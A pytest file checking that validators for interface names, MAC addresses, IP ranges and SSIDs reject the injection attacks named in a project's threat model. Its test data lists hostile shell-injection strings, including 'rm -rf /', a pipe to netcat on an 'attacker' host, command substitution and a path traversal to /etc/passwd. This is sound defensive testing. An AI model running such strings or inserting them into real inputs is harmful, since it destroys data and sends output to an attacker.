"""Make the THREAT_MODEL.md mitigations testable, not just aspirational.

Each untrusted-input boundary documented in THREAT_MODEL.md maps to a validator
in core/validators.py; these tests assert those validators actually reject the
attacks the threat model claims they stop.
"""

import os
import sys
from pathlib import Path

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.validators import (
    is_valid_ip_range,
    is_valid_ssid,
    validate_iface,
    validate_mac,
)

ROOT = Path(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


@pytest.mark.parametrize("payload", [
    "wlan0; rm -rf /",
    "eth0 && reboot",
    "wlan0 | nc attacker 4444",
    "$(whoami)",
    "`id`",
    "wlan0\nreboot",
    "../../etc/passwd",
    "a" * 16,          # exceeds IFNAMSIZ-1
])
def test_validate_iface_rejects_injection_payloads(payload):
    with pytest.raises(ValueError):
        validate_iface(payload)


def test_validate_mac_rejects_trailing_command():
    with pytest.raises(ValueError):
        validate_mac("aa:bb:cc:dd:ee:ff; reboot")


def test_ip_range_rejects_non_cidr():
    assert is_valid_ip_range("192.168.0.0/24; drop") is False


def test_ssid_length_bound_is_enforced():
    assert is_valid_ssid("A" * 33) is False
    assert is_valid_ssid("A" * 32) is True


def test_threat_model_maps_each_validator_to_code():
    text = (ROOT / "THREAT_MODEL.md").read_text(encoding="utf-8")
    for fn in ("validate_iface", "validate_mac", "is_valid_ssid", "is_valid_ip_range"):
        assert fn in text, f"THREAT_MODEL.md should map {fn}() to its boundary"
